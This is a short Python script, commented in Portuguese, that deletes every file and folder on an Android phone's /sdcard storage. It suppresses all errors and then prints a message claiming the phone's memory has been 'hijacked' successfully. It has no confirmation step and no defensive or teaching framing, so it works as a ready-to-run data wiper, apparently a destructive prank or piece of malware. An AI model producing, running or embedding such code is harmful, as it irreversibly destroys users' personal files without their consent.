# -*- coding: utf-8 -*-

import os
import shutil

# Caminho do diretório a ser excluído
diretorio_sdcard = '/sdcard'

try:
    # Remover todos os arquivos e diretórios dentro do diretório
    for filename in os.listdir(diretorio_sdcard):
        file_path = os.path.join(diretorio_sdcard, filename)
        try:
            if os.path.isfile(file_path) or os.path.islink(file_path):
                os.unlink(file_path)
            elif os.path.isdir(file_path):
                shutil.rmtree(file_path)
        except Exception as e:
            # Comentamos as mensagens de erro
            pass

    # Exibir mensagem de conclusão
    print("Memória do celular sequestrada com susseso.")
except Exception as e:
    # Comentamos a mensagem de erro
    pass
